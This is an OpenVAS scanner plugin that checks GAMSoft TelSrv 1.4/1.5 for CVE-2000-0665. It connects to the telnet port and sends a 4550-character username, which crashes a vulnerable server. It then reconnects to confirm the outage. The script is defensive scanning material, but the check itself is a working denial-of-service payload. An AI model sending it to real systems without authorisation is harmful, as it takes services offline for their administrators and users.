# OpenVAS Vulnerability Test
# $Id: TelSrv_DoS.nasl 13634 2019-02-13 12:06:16Z cfischer $
# Description: GAMSoft TelSrv 1.4/1.5 Overflow
#
# Authors:
# Prizm <Prizm@RESENTMENT.org>
# Changes by rd:
# - description changed somehow
# - handles the fact that the shareware may not be registered
#
# Copyright:
# Copyright (C) 2000 Prizm <Prizm@RESENTMENT.org
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10474");
  script_version("$Revision: 13634 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-13 13:06:16 +0100 (Wed, 13 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(1478);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2000-0665");
  script_name("GAMSoft TelSrv 1.4/1.5 Overflow");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2000 Prizm <Prizm@RESENTMENT.org");
  script_family("Denial of Service");
  script_dependencies("telnetserver_detect_type_nd_version.nasl");
  script_require_ports("Services/telnet", 23);
  script_mandatory_keys("telnet/banner/available");

  script_tag(name:"solution", value:"Contact your vendor for a patch.");

  script_tag(name:"summary", value:"It is possible to crash the remote telnet server by
  sending a username that is 4550 characters long.");

  script_tag(name:"impact", value:"An attacker may use this flaw to prevent you
  from administering this host remotely.");

  script_tag(name:"solution_type", value:"Mitigation");

  exit(0);
}

include("telnet_func.inc");

port = get_telnet_port(default:23);

soc = open_sock_tcp(port);
if(soc)
{
  r = telnet_negotiate(socket:soc);
  r2 = recv(socket:soc, length:4096);
  r = r + r2;
  if(r)
  {
    r = recv(socket:soc, length:8192);
    if("5 second delay" >< r)
      sleep(5);

    r = recv(socket:soc, length:8192);
    req = string(crap(4550), "\r\n");
    send(socket:soc, data:req);
    close(soc);
    sleep(1);

    soc2 = open_sock_tcp(port);
    if(!soc2)
      security_message(port);
    else {
      r = telnet_negotiate(socket:soc2);
      r2 = recv(socket:soc2, length:4096);
      r = r + r2;
      close(soc2);
      if(!r)
        security_message(port);
    }
  }
}